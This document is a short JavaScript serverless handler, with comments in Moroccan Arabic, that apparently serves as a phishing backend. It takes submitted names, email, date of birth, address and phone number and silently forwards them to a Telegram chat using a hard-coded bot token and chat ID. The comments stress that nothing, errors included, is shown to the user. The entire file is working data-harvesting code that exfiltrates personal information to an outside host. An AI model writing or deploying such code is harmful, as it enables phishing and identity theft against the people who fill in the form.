import fetch from "node-fetch";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).end(); // ما يبانش أي حاجة للمستخدم
  }

  const { first_name, last_name, email, dob, address, postal, city, num } = req.body;

  const BOT_TOKEN = "7434892132:AAHI5vTd19Ngo57sBY-3JO247rlcZqU18QM"; // token ديالك
  const CHAT_ID = "-4982276528"; // chat ID ديالك

  const message = `
📨 بيانات جديدة:
- nome: ${first_name} ${last_name}
- email: ${email}
- date : ${dob}
- address: ${address}, ${city}, ${postal}
- num : ${num}
  `;

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
    });

    // ما كاينش response للمستخدم
    return res.status(200).end();
  } catch (err) {
    console.error(err); // غادي يبقى في console فقط
    return res.status(500).end(); // ما يبانش الخطأ للمستخدم
  }
}
